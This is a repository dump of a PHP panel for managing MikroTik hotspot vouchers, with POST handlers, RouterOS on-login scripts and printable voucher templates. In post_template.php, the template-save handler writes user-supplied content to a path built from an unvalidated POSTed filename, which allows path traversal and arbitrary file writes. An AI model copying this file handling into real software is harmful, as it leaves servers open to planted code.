+// }
+   
+?>
+
+
+
+================================================
+FILE: post/post_generate_voucher.php
+================================================
+<?php
+
+session_start();
+set_time_limit(0);
+error_reporting(0);
+// ini_set('display_errors', 1);
+
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+include_once("../core/generator_functions.php");
+
+if (isset($_POST['qty']) && isset($_SESSION["mikhmon"])) {
+
+	// Ambil semua POST dengan null coalescing
+	$qty = $_POST['qty'];
+	$server = $_POST['server'];
+	$user = $_POST['user'];
+	$userl = $_POST['userl'];
+	$prefix = $_POST['prefix'];
+	$char = $_POST['char'];
+	$profile = $_POST['profile'];
+	$timelimit = $_POST['timelimit'];
+	$datalimit = $_POST['datalimit'];
+	$gcomment = $_POST['gcomment'];
+	$gencode = $_POST['gencode'];
+
+
+
+	// Hitung data limit
+	// Hitung data limit dengan validasi
+	if (!empty($datalimit)) {
+		$last_char = strtolower(substr($datalimit, -1));
+		if (in_array($last_char, ['m', 'g'])) {
+			$value = substr($datalimit, 0, -1);
+			if (is_numeric($value)) {
+				$dlimit = (int)$value;
+			} else {
+				$dlimit = 0;
+			}
+		} else {
+			// Bisa jadi hanya angka byte
+			$dlimit = is_numeric($datalimit) ? (int)$datalimit : 0;
+		}
+
+		$mbgb = ($last_char == "g") ? 1073741824 : 1048576;
+	} else {
+		$dlimit = 0;
+		$mbgb = 1048576;
+	}
+
+	$datalimit = $dlimit * $mbgb;
+
+	// Buat comment
+	$commt = $user . "-" . $gencode . "-" . date("m.d.y") . "-" . $gcomment;
+
+	// Koneksi ke MikroTik
+	include_once('../core/routeros_api.class.php');
+	include_once("../config/config.php");
+
+	$m_user = explode("?", $_POST['sessname'])[1];
+	$iphost = explode('!', $data[$m_user][1])[1];
+	$userhost = explode('@|@', $data[$m_user][2])[1];
+	$passwdhost = explode('#|#', $data[$m_user][3])[1];
+
+	$API = new RouterosAPI();
+	$API->debug = false;
+
+	if (!$API->connect($iphost, $userhost, dec_rypt($passwdhost))) {
+		echo json_encode(["message" => "error", "data" => ["error" => "Gagal terhubung ke MikroTik"]]);
+		exit;
+	}
+
+	// Proses generate user biasa atau voucher
+	if ($user == "up") {
+		for ($i = 1; $i <= $qty; $i++) {
+			if ($char == "lower") {
+				$u[$i] = randLC($userl);
+			} elseif ($char == "upper") {
+				$u[$i] = randUC($userl);
+			} elseif ($char == "upplow") {
+				$u[$i] = randULC($userl);
+			} elseif ($char == "mix") {
+				$u[$i] = randNLC($userl);
+			} elseif ($char == "mix1") {
+				$u[$i] = randNUC($userl);
+			} elseif ($char == "mix2") {
+				$u[$i] = randNULC($userl);
+			}
+			if ($userl == 4) {
+				$p[$i] = randN(4);
+			} elseif ($userl == 5) {
+				$p[$i] = randN(5);
+			} elseif ($userl == 6) {
+				$p[$i] = randN(6);
+			} elseif ($userl == 7) {
+				$p[$i] = randN(7);
+			} elseif ($userl == 8) {
+				$p[$i] = randN(8);
+			}
+
+			$u[$i] = "$prefix$u[$i]";
+		}
+
+		for ($i = 1; $i <= $qty; $i++) {
+			$API->comm("/ip/hotspot/user/add", array(
+				"server" => "$server",
+				"name" => "$u[$i]",
+				"password" => "$p[$i]",
+				"profile" => "$profile",
+				"limit-uptime" => "$timelimit",
+				"limit-bytes-total" => "$datalimit",
+				"comment" => "$commt",
+			));
+		}
+	}
+
+	if ($user == "vc") {
+		// fallback default value
+		$shuf = max(1, $userl - ($a[$userl] ?? 0)); // pastikan tidak negatif
+
+		for ($i = 1; $i <= $qty; $i++) {
+			// inisialisasi awal
+			$u[$i] = "";
+			$p[$i] = "";
+
+			// tentukan username
+			if ($char == "lower1") {
+				$u[$i] = randLC($shuf);
+			} elseif ($char == "upper1") {
+				$u[$i] = randUC($shuf);
+			} elseif ($char == "upplow1") {
+				$u[$i] = randULC($shuf);
+			} else {
+				// fallback jika char tidak sesuai
+				$u[$i] = randNULC($shuf);
+			}
+
+			// tentukan password
+			if ($userl >= 4 && $userl <= 5) {
+				$p[$i] = randN(2);
+			} elseif ($userl >= 6 && $userl <= 7) {
+				$p[$i] = randN(3);
+			} elseif ($userl == 8) {
+				$p[$i] = randN(4);
+			} else {
+				$p[$i] = randN(2); // default
+			}
+
+			// gabungkan
+			$u[$i] = "$prefix" . $u[$i] . $p[$i];
+
+			// override jika char == num / mix / dll
+			if ($char == "num") {
+				$p[$i] = match (true) {
+					$userl == 3 => randN(3),
+					$userl == 4 => randN(4),
+					$userl == 5 => randN(5),
+					$userl == 6 => randN(6),
+					$userl == 7 => randN(7),
+					$userl == 8 => randN(8),
+					default => randN(4)
+				};
+				$u[$i] = "$prefix" . $p[$i];
+			} elseif ($char == "mix") {
+				$u[$i] = "$prefix" . randNLC($userl);
+			} elseif ($char == "mix1") {
+				$u[$i] = "$prefix" . randNUC($userl);
+			} elseif ($char == "mix2") {
+				$u[$i] = "$prefix" . randNULC($userl);
+			}
+		}
+
+		// tambahkan ke hotspot
+		for ($i = 1; $i <= $qty; $i++) {
+			$API->comm("/ip/hotspot/user/add", array(
+				"server" => "$server",
+				"name" => "$u[$i]",
+				"password" => "$u[$i]",
+				"profile" => "$profile",
+				"limit-uptime" => "$timelimit",
+				"limit-bytes-total" => "$datalimit",
+				"comment" => "$commt",
+			));
+		}
+	}
+
+	// Print hasil
+	$get_hotspotusers = $API->comm("/ip/hotspot/user/print", ["?comment" => "$commt"]);
+	$_SESSION[$m_user . $commt] = $get_hotspotusers;
+
+	if (!empty($get_hotspotusers['!trap'][0]['message'])) {
+		$message = $get_hotspotusers['!trap'][0]['message'];
+		echo json_encode(["message" => "error", "data" => ["error" => $message]]);
+	} else {
+		echo json_encode(["message" => "success", "data" => ["count" => count($get_hotspotusers), "comment" => $commt, "profile" => $profile]]);
+	}
+} else {
+	$get_self = explode("/", $_SERVER['PHP_SELF']);
+	$self[] = $get_self[count($get_self) - 1];
+
+	if ($self[0] !== "index.php"  && $self[0] !== "") {
+		include_once("../core/route.php");
+	}
+}
+
+
+
+================================================
+FILE: post/post_hotspot_remove.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+
+
+if(isset($_POST['sessname']) && isset($_SESSION["mikhmon"])){
+
+    $m_user = explode("?",$_POST['sessname'])[1];
+    $where = $_POST['where'];
+    $id = $_POST['id'];
+
+    // routeros api
+    include_once('../core/routeros_api.class.php');
+
+    include_once("../config/config.php");
+    // read config
+
+    $iphost = explode('!', $data[$m_user][1])[1];
+    $userhost = explode('@|@', $data[$m_user][2])[1];
+    $passwdhost = explode('#|#', $data[$m_user][3])[1];
+
+    $API = new RouterosAPI();
+    $API->debug = false;
+
+    if($API->connect($iphost, $userhost, dec_rypt($passwdhost))){
+    
+    if($where == "user_"){
+        $API->comm("/ip/hotspot/user/remove", array(
+            ".id" => $id,));	
+    }else  if($where == "profile_"){
+        $API->comm("/ip/hotspot/user/profile/remove", array(
+            ".id" => $id,));	
+    }else  if($where == "active_"){
+        $API->comm("/ip/hotspot/active/remove", array(
+            ".id" => $id,));	
+    }else  if($where == "host_"){
+        $API->comm("/ip/hotspot/host/remove", array(
+            ".id" => $id,));	
+    }
+
+    $mess = array(
+        "message" => "success"
+      );
+        echo json_encode($mess);
+    }else{
+      $message = "error";
+
+      $mess = array(
+        "message"  => $message
+      );
+      echo json_encode($mess);
+    }
+	   
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
+// }
+   
+?>
+
+
+
+================================================
+FILE: post/post_logout.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+
+if(isset($_POST['logout']) && isset($_SESSION["mikhmon"])){
+    session_destroy();
+    echo $_POST['logout'];
+
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
+// }
+   
+?>
+
+
+
+================================================
+FILE: post/post_template.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+include_once("../core/routeros_api.class.php");
+
+
+
+if(isset($_POST['router_']) && isset($_SESSION["mikhmon"])){
+   $do = $_POST['do'];    
+    if($do == "saveTemplate"){
+  		$template = $_POST['_template'];
+		$t_file = "../template/".$_POST['file_'];
+		if (is_file($t_file) && !is_writable($t_file)) {
+			    $mess->message = "Error, cannot write config file, please check folder or file permissions.";
+	    		echo json_encode($mess);
+    	}else{
+
+	        $handle = fopen($t_file, 'w') or die('Cannot open file:  ' . $t_file);
+	        fwrite($handle, $template);
+	      
+			$mess = array(
+				"message" => "Saved"
+			  );
+	    		echo json_encode($mess);
+	    } 
+    }
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+	include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
+// }
+   
+?>
+
+
+
+================================================
+FILE: post/post_update_user.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+
+
+
+if(isset($_POST['name']) && isset($_SESSION["mikhmon"])){
+
+	$m_user = explode("?",$_POST['sessname'])[1];
+	$reset = $_POST['reset'];
+	$uid = $_POST['uid'];
+	$server = $_POST['server'];
+	$name = $_POST['name'];
+	$password = $_POST['password'];
+	$profile = $_POST['profile'];
+	$mac_addr = $_POST['macaddr'];
+	$timelimit = $_POST['timelimit'];
+	$datalimit = $_POST['datalimit'];
+	$comment = $_POST['comment'];
+	$expdate = $_POST['expdate'];
+	$ucode = $_POST['ucode'];
+
+	if($expdate == "" && $ucode == ""){
+		$comment = $comment;
+	}else if($expdate == "" && $ucode !== ""){
+		if((substr($ucode,0,3) == "up-") || (substr($ucode,0,3) == "vc-")){
+			if($name == $password){
+				$comment = "vc-".substr($ucode,3,strlen($ucode)).$comment;
+			}else{
+				$comment = "up-".substr($ucode,3,strlen($ucode)).$comment;
+			}
+		}else{
+			$comment = $ucode.substr($ucode,3,strlen($ucode)).$comment;
+		}
+	}else if($expdate !== "" && $ucode == ""){
+		$comment = $expdate. " " .$comment;
+	}
+
+	
+    // routeros api
+    include_once('../core/routeros_api.class.php');
+
+    include_once("../config/config.php");
+    // read config
+
+    $iphost = explode('!', $data[$m_user][1])[1];
+    $userhost = explode('@|@', $data[$m_user][2])[1];
+    $passwdhost = explode('#|#', $data[$m_user][3])[1];
+
+    $API = new RouterosAPI();
+    $API->debug = false;
+
+    $API->connect($iphost, $userhost, dec_rypt($passwdhost));
+
+    if($reset == "yes"){
+    	$API->comm("/ip/hotspot/user/reset-counters", array(
+			".id" => "$uid",
+		));
+    }
+    
+	$add = $API->comm("/ip/hotspot/user/set", array(
+	  ".id" => "$uid",		
+	  "server" => "$server",
+      "name" => "$name",
+      "password" => "$password",
+      "profile" => "$profile",
+      "mac-address" => "$mac_addr",
+      "disabled" => "no",
+      "limit-uptime" => "$timelimit",
+      "limit-bytes-total" => "$datalimit",
+      "comment" => "$comment",
+    ));
+
+
+    if(!empty($add['!trap'][0]['message'])){
+		$message = $add['!trap'][0]['message'];
+		$mess = array(
+			"message" => "error",
+			"data" => array("error" => $message)
+		  );
+		echo json_encode($mess);
+	}else{
+    	$getuser = $API->comm("/ip/hotspot/user/print", array(
+	      "?.id" => "$uid",
+	    ));
+
+		$mess = array(
+			"message" => "success",
+			"data" => $getuser[0]
+		  );
+		echo json_encode($mess);
+	}
+	
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+	include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
+// }
+   
+?>
+
+
+
+================================================
+FILE: post/post_update_userprofile.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+
+
+
+if(isset($_POST['name']) && isset($_SESSION["mikhmon"])){
+
+	$m_user = explode("?",$_POST['sessname'])[1];
+
+    $name = (preg_replace('/\s+/', '-',$_POST['name']));
+    $upid = ($_POST['upid']);
+        $sharedusers = ($_POST['sharedusers']);
+        $ratelimit = ($_POST['ratelimit']);
+        $expmode = ($_POST['expmode']);
+        $validity = ($_POST['validity']);
+        $getprice = ($_POST['price']);
+        $getsprice = ($_POST['sellingprice']);
+        $addrpool = ($_POST['addresspool']);
+        if ($getprice == "") {
+          $price = "0";
+        } else {
+          $price = $getprice;
+        }
+        if ($getsprice == "") {
+          $sprice = "0";
+        } else {
+          $sprice = $getsprice;
+        }
+        $getlock = ($_POST['lockuser']);
+        if ($getlock == "Enable") {
+          $lock = '; [:local mac $"mac-address"; /ip hotspot user set mac-address=$mac [find where name=$user]]';
+        } else {
+          $lock = "";
+        }
+        
+        $srvlock = ($_POST['lockserver']);
+        if ($srvlock == "Disable") {
+          $slock = "";
+        } else if ($srvlock !== "Disable") {
+          $slock = '; [:local mac $"mac-address"; :local srv [/ip hotspot host get [find where mac-address="$mac"] server]; /ip hotspot user set server=$srv [find where name=$user]]';
+        }
+         
+        $parent = ($_POST['parentqueue']);
+        
+        if ($expmode == "ntf" || $expmode == "ntfc") {
+          $mode = "N";
+        }else if ($expmode == "rem" || $expmode == "remc") {
+          $mode = "X";
+        }
+        
+        $record = '; :local mac $"mac-address"; :local time [/system clock get time ]; /system script add name="$date-|-$time-|-$user-|-'.$price.'-|-$address-|-$mac-|-' . $validity . '-|-'.$name.'-|-$comment" owner="$month$year" source=$date comment=mikhmon';
+        
+        $onlogin = ':put (",'.$expmode.',' . $price . ',' . $validity . ','.$sprice.',,' . $getlock . ',' . $srvlock . ',"); :local mode "'.$mode.'"; {:local date [ /system clock get date ];:local year [ :pick $date 7 11 ];:local month [ :pick $date 0 3 ];:local comment [ /ip hotspot user get [/ip hotspot user find where name="$user"] comment]; :local ucode [:pic $comment 0 2]; :if ($ucode = "vc" or $ucode = "up" or $comment = "") do={ /sys sch add name="$user" disable=no start-date=$date interval="' . $validity . '"; :delay 2s; :local exp [ /sys sch get [ /sys sch find where name="$user" ] next-run]; :local getxp [len $exp]; :if ($getxp = 15) do={ :local d [:pic $exp 0 6]; :local t [:pic $exp 7 16]; :local s ("/"); :local exp ("$d$s$year $t"); /ip hotspot user set comment="$exp $mode" [find where name="$user"];}; :if ($getxp = 8) do={ /ip hotspot user set comment="$date $exp $mode" [find where name="$user"];}; :if ($getxp > 15) do={ /ip hotspot user set comment="$exp $mode" [find where name="$user"];}; /sys sch remove [find where name="$user"]';
+        
+    
+        if ($expmode == "rem") {
+          $onlogin = $onlogin . $lock . $slock ."}}";
+          $mode = "remove";
+        } elseif ($expmode == "ntf") {
+          $onlogin = $onlogin . $lock . $slock ."}}";
+          $mode = "set limit-uptime=1s";
+        } elseif ($expmode == "remc") {
+          $onlogin = $onlogin . $record . $lock . $slock ."}}";
+          $mode = "remove";
+        } elseif ($expmode == "ntfc") {
+          $onlogin = $onlogin . $record . $lock . $slock ."}}";
+          $mode = "set limit-uptime=1s";
+        } elseif ($expmode == "0" && $price != "") {
+          $onlogin = ':put (",,' . $price . ',,'.$sprice.',noexp,' . $getlock . ','.$srvlock.',")' . $lock . $slock;
+        } else {
+          $onlogin = "";
+        }
+
+	
+    // routeros api
+    include_once('../core/routeros_api.class.php');
+
+    include_once("../config/config.php");
+    // read config
+
+    $iphost = explode('!', $data[$m_user][1])[1];
+    $userhost = explode('@|@', $data[$m_user][2])[1];
+    $passwdhost = explode('#|#', $data[$m_user][3])[1];
+
+    $API = new RouterosAPI();
+    $API->debug = false;
+
+    $API->connect($iphost, $userhost, dec_rypt($passwdhost));
+
+       
+	$add = $API->comm("/ip/hotspot/user/profile/set", array(
+        ".id" => "$upid",	
+      "name" => "$name",
+      "address-pool" => "$addrpool",
+      "rate-limit" => "$ratelimit",
+      "shared-users" => "$sharedusers",
+      "status-autorefresh" => "1m",
+      "on-login" => "$onlogin",
+      "parent-queue" => "$parent",
+    ));
+
+	
+	
+    
+    if(!empty($add['!trap'][0]['message'])){
+		$message = $add['!trap'][0]['message'];
+		$mess = array(
+			"message" => "error",
+			"data" => array("error" => $message)
+		  );
+		echo json_encode($mess);
+	}else{
+    	$getuser = $API->comm("/ip/hotspot/user/profile/print", array(
+	      "?.id" => "$upid",
+	    ));
+	 
+		$mess = array(
+			"message" => "success",
+			"data" => $getuser[0]
+		  );
+		echo json_encode($mess);
+	}
+	
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+  include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
+// }
+   
+?>
+
+
+
+================================================
+FILE: template/footer.default.txt
+================================================
+
+<script>
+    if($(".validity")){
+        nice('.validity')
+    }
+    if($(".timelimit")){
+        nice('.timelimit')
+    }
+
+    if($(".price")){
+        $(".price").html(currencyFormat(Number($(".price").html()),currency));
+    }
+    
+    function nice(e){
+        var x =  $(e).html();
+		var s = "";
+		var cid = ["Rp","RP","IDR"];
+		var d_ = "";
+		var h_ = "";
+		var w_ = "";
+		if(Number(x.substring(0,1)) > 1){
+			s = "s"
+		}
+		console.log(cid.indexOf(currency)+" "+currency)
+		if(cid.indexOf(currency) > -1){
+			d_ = "hari";
+			h_ = "jam";
+			w_ = "minggu";
+		}else{
+			d_ = "day"+s;
+			h_ = "hour"+s;
+			w_ = "week"+s;
+		}
+        if(x.substring(x.length - 1) == "d"){
+            $(e).html(x.replace("d",d_));
+        }else if(x.substring(x.length - 1) == "h"){
+            $(e).html(x.replace("h",h_));
+        }else if(x.substring(x.length - 1) == "w"){
+            $(e).html(x.replace("w",w_));
+        }
+    }
+</script>
+</body>
+</html>
+
+
+================================================
+FILE: template/footer.small.txt
+================================================
+
+<script>
+    if($(".validity")){
+        nice('.validity')
+    }
+    if($(".timelimit")){
+        nice('.timelimit')
+    }
+
+    if($(".price")){
+        $(".price").html(currencyFormat(Number($(".price").html()),currency));
+    }
+    
+    function nice(e){
+        var x =  $(e).html();
+        if(x.substring(x.length - 1) == "d"){
+            $(e).html(x.replace("d","Hari"));
+        }else if(x.substring(x.length - 1) == "h"){
+            $(e).html(x.replace("h","Jam"));
+        }else if(x.substring(x.length - 1) == "w"){
+            $(e).html(x.replace("w","Minggu"));
+        }
+    }
+</script>
+</body>
+</html>
+
+
+================================================
+FILE: template/footer.thermal.txt
+================================================
+
+<script>
+    if($(".validity")){
+        nice('.validity')
+    }
+    if($(".timelimit")){
+        nice('.timelimit')
+    }
+
+    if($(".price")){
+        $(".price").html(currencyFormat(Number($(".price").html()),currency));
+    }
+    
+    function nice(e){
+        var x =  $(e).html();
+        if(x.substring(x.length - 1) == "d"){
+            $(e).html(x.replace("d","Hari"));
+        }else if(x.substring(x.length - 1) == "h"){
+            $(e).html(x.replace("h","Jam"));
+        }else if(x.substring(x.length - 1) == "w"){
+            $(e).html(x.replace("w","Minggu"));
+        }
+    }
+</script>
+</body>
+</html>
+
+
+================================================
+FILE: template/header.default.txt
+================================================
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Voucher</title>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<meta http-equiv="pragma" content="no-cache" />
+		<link rel="icon" href="assets/img/favicon.png" />
+        <script src="assets/js/jquery.min.js"></script>
+		<style>
+			body {
+			  color: #000000;
+			  background-color: #FFFFFF;
+			  font-size: 14px;
+			  font-family:  'Helvetica', arial, sans-serif;
+			  margin: 0px;
+			  -webkit-print-color-adjust: exact;
+			}
+			table.voucher {
+			  display: inline-block;
+			  border: 2px solid black;
+			  margin: 2px;
+			}
+			@page
+			{
+			  size: auto;
+			  margin-left: 7mm;
+			  margin-right: 3mm;
+			  margin-top: 9mm;
+			  margin-bottom: 3mm;
+			}
+			@media print
+			{
+			  table { page-break-after:auto }
+			  tr    { page-break-inside:avoid; page-break-after:auto }
+			  td    { page-break-inside:avoid; page-break-after:auto }
+			  thead { display:table-header-group }
+			  tfoot { display:table-footer-group }
+			}
+			.num {
+			  float:right;
+			  display:inline-block;
+			}
+
+			.rotate {
+			  max-width: 15px;
+			  white-space: nowrap;
+			  vertical-align: bottom;
+			  padding-right: 5px;
+			}
+
+			.rotate > div {
+			  transform: rotate(-90deg);
+			}
+
+			.qrcode{
+			  height:60px;
+			  width:60px;
+			}
+			.vc{
+				width: 100%; 
+				font-weight: bold; 
+				font-size: 18px; 
+				text-align: center;
+				display:none;
+			}	
+			.up{
+				width: 100%; 
+				font-weight: bold; 
+				font-size: 15px; 
+				text-align: left;
+				display:none;
+			}			
+		</style>
+    </head>
+    <body>
+
+
+================================================
+FILE: template/header.small.txt
+================================================
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Voucher</title>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<meta http-equiv="pragma" content="no-cache" />
+		<link rel="icon" href="assets/img/favicon.png" />
+		<script src="assets/js/jquery.min.js"></script>
+		<style>
+			body {
+				color: #000000;
+				background-color: #FFFFFF;
+				font-size: 14px;
+				font-family:  'Helvetica', arial, sans-serif;
+				margin: 0px;
+				-webkit-print-color-adjust: exact;
+			}
+			table.voucher {
+				display: inline-block;
+				border: 2px solid black;
+				margin: 2px;
+			}
+			@page
+			{
+				size: auto;
+				margin-left: 7mm;
+				margin-right: 3mm;
+				margin-top: 9mm;
+				margin-bottom: 3mm;
+			}
+			@media print
+			{
+				table { page-break-after:auto }
+				tr    { page-break-inside:avoid; page-break-after:auto }
+				td    { page-break-inside:avoid; page-break-after:auto }
+				thead { display:table-header-group }
+				tfoot { display:table-footer-group }
+			}
+			.num {
+				float:right;
+				display:inline-block;
+			}
+
+		</style>
+	</head>
+	<body>
+
+
+================================================
+FILE: template/header.thermal.txt
+================================================
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Voucher</title>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<meta http-equiv="pragma" content="no-cache" />
+		<link rel="icon" href="assets/img/favicon.png" />
+		<script src="assets/js/jquery.min.js"></script>
+		<style>
+			body {
+				color: #000000;
+				background-color: #FFFFFF;
+				font-size: 14px;
+				font-family:  'Helvetica', arial, sans-serif;
+				margin: 0px;
+				-webkit-print-color-adjust: exact;
+			}
+			table.voucher {
+				display: inline-block;
+				border: 2px solid black;
+				margin: 2px;
+			}
+			@page
+			{
+				size: auto;
+				margin-left: 7mm;
+				margin-right: 3mm;
+				margin-top: 9mm;
+				margin-bottom: 3mm;
+			}
+			@media print
+			{
+				table { page-break-after:auto }
+				tr    { page-break-inside:avoid; page-break-after:auto }
+				td    { page-break-inside:avoid; page-break-after:auto }
+				thead { display:table-header-group }
+				tfoot { display:table-footer-group }
+			}
+			.rotate {
+				max-width: 15px;
+				white-space: nowrap;
+				vertical-align: bottom;
+				padding-right: 5px;
+			}
+
+			.rotate > div {
+				transform: rotate(-90deg);
+			}
+			.qrcode{
+				height:100px;
+				width:100px;
+			}
+			.vc{
+				display:none;
+			}	
+			.up{
+				display:none;
+			}
+			.price{
+				font-size:20px;
+
+			}
+
+		</style>
+	</head>
+	<body>
+
+
+================================================
+FILE: template/row.default.txt
+================================================
+<table class="voucher" style="width: 230px;">
+	<tbody>
+		<tr>
+			<td style="font-weight: bold; border-right: 2px  dashed black;" class="rotate" rowspan="4"><div><span class="price">%price%</span></div></td>
+			<td style="font-weight: bold" colspan="2">%hotspotName%</td>
+			<td rowspan="3"><div >%qrCode% </div></td>  
+		</tr>
+		<tr>
+			<td class="vc">%username%</td>
+			<td class="up">
+				User: %username%
+				<br>
+				Pass: %password%
+			</td>
+		</tr>
+		<tr>
+			<td style="font-size: 10px;">
+				<span class="validity">%validity%</span> 
+				<span class="timelimit">%limitUptime%</span> 
+				<span>%limitBytesTotal%</span>
+			</td>
+		</tr>
+		<tr>
+			<td colspan="3" style="font-size: 10px;">Login: http://%dnsName% <span class="num"> [%#%]</span></td>
+		</tr>
+	</tbody>
+</table>
+<script>
+	if("%username%" == "%password%"){
+		$(".vc").show()
+	}else if("%username%" != "%password%"){
+		$(".up").show()
+	}
+
+	// var tcolor = {
+	//   15000 : "red",
+	// }
+
+	// $(".price").css("color",tcolor["%price%"]);
+
+</script>
+
+
+
+
+
+================================================
+FILE: template/row.small.txt
+================================================
+<table class="voucher" style=" width: 140px;">
+	<thead>
+		<tr>
+			<th colspan="2" style="width:100%;text-align: left; font-size: 12px; font-weight:bold; border-bottom: 1px black solid;">%hotspotName%<span class="num">%#%</span>
+			</th>
+		</tr>
+	</thead>
+	<tbody>
+		<tr style="color: black; font-size: 10px; text-align: center;">
+			<td class="vc" style="display:none; width: 160px;">Voucher &nbsp;</td>
+			<td class="up" style="display:none; width: 80px;">Username</td>
+			<td class="up" style="display:none; width: 80px;">Password</td>
+		</tr>
+		<tr style="color: black; font-size: 12px; text-align: center;">
+			<td style="border: 1px solid black; font-weight:bold;">%username%</td>
+			<td class="up" style="border: 1px solid black; font-weight:bold;display:none;">%password%</td>
+		</tr>
+	</tbody>
+	<tfoot>
+		<tr style="color: black; font-size: 10px; text-align: center;">
+			<th colspan="2" ><span class="validity">%validity%</span> <span class="timelimit">%limitUptime%</span> <span>%limitBytesTotal%</span> <span class="price">%price%</span></th>
+		</tr>
+	</tfoot>
+</table>
+<script>
+	if("%username%" == "%password%"){
+		$(".vc").show()
+	}else if("%username%" != "%password%"){
+		$(".up").show()
+	}
+</script>
+
+
+
+================================================
+FILE: template/row.thermal.txt
+================================================
+<table class="voucher" style=" width: 180px;">
+	<tbody>
+		<tr>
+			<td style="text-align: center; font-size: 14px; font-weight:bold;">%hotspotName%</td>
+		</tr>
+		<tr>
+			<td style="text-align: center; font-size: 14px; border-bottom: 1px black solid;">
+				<img src="%logo%" alt="logo" style="height:30px;border:0;"><br>
+				<span>%timeStamp%</span>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<table style=" text-align: center; width: 170px; font-size: 12px;">
+					<tbody>
+						<tr>
+							<td>
+								<table style="width:100%;">
+									<tr class="vc">
+										<td font-size: 12px;>Kode Voucher</td>
+									</tr>
+									<tr  class="vc">
+										<td style="width:100%; border: 1px solid black; font-weight:bold; font-size:16px;">%username%</td>
+									</tr>
+									<tr class="up">
+										<td style="width: 50%">Username</td>
+										<td >Password</td>
+									</tr>
+									<tr style="font-size: 14px;" class="up">
+										<td style="border: 1px solid black; font-weight:bold;">%username%</td>
+										<td style="border: 1px solid black; font-weight:bold;">%password%</td>
+									</tr>
+								</table>
+							</td>
+						</tr>
+
+						<tr>
+							<td colspan="2" style="border-top: 1px solid black;font-weight:bold; font-size:14px"><span class="validity">%validity%</span> <span class="timelimit">%limitUptime%</span> <span>%limitBytesTotal%</span></td>
+						</tr>
+						<tr>
+							<td><span class="price">%price%</span></td>
+						</tr>
+						<tr>
+							<td colspan="2">
+								<div >%qrCode% </div>
+								%comment%
+							</td>
+						</tr>
+						<tr>
+							<td colspan="2" style="font-weight:bold; font-size:12px">Login: http://%dnsName%</td>
+						</tr>
+					</tbody>
+				</table>
+			</td>
+		</tr>
+	</tbody>
+</table>
+<script>
+	if("%username%" == "%password%"){
+		$(".vc").show()
+	}else if("%username%" != "%password%"){
+		$(".up").show()
+	}
+</script>
+
+
+
+================================================
+FILE: assets/js/func.js
+================================================
+localStorage.setItem("?admin_idleto", 15);
+var idleto = localStorage.getItem(session + "_idleto");
+function idleTimer() {
+  if (document.getElementById("timer")) {
+    var e = document.getElementById("timer");
+    function t() {
+      e.innerHTML = idleto + ":00";
+    }
+    (window.onmousemove = t),
+      (window.onmousedown = t),
+      (window.onclick = t),
+      (window.onscroll = t),
+      (window.onkeypress = t);
+  }
+}
+if (document.getElementById("timer")) {
+  idleto = localStorage.getItem(session + "_idleto");
+  document.getElementById("timer").innerHTML = idleto + ":00";
+}
+function startTimer() {
+  if (document.getElementById("timer")) {
+    var e = document.getElementById("timer"),
+      t = e.innerHTML.split(/[:]+/),
+      a = t[0],
+      s = checkSecond(t[1] - 1);
+    59 == s && (a -= 1),
+      0 == a && 0 == s && ((e.innerHTML = "0:00"), $("#logOut").click()),
+      (e.innerHTML = a + ":" + s),
+      setTimeout(startTimer, 1e3);
+  }
+}
+function checkSecond(e) {
+  return e < 10 && e >= 0 && (e = "0" + e), e < 0 && (e = "59"), e;
+}
+function countTableRow(e) {
+  var t = $("#" + e + " tr").filter(function () {
+    return $(this).hasClass("yes");
+  });
+  $("#total-" + e).html(t.length);
+}
+function menuNonActive(e) {
+  $("#" + e)
+    .removeClass("block")
+    .addClass("hide"),
+    $("#btn-" + e).removeClass("card-tab-active");
+}
+function menuActive(e) {
+  $("#" + e)
+    .removeClass("hide")
+    .addClass("block"),
+    $("#btn-" + e).addClass("card-tab-active");
+}
+function filterBy(e, t, a) {
+  var s = document.getElementById(t);
+  $("#" + t).val(a),
+    filterTable(e, t),
+    "" == s.value
+      ? localStorage.setItem(session + "AutoReload", 0)
+      : localStorage.setItem(session + "AutoReload", 1),
+    s.dispatchEvent(new KeyboardEvent("keyup", { key: "Shift" }));
+}
+function shPass(e) {
+  var t = $("#" + e);
+  t.hasClass("key") ? t.removeClass("key") : t.addClass("key");
+}
+function filterTable(e, t, a) {
+  var s = document.getElementById(t);
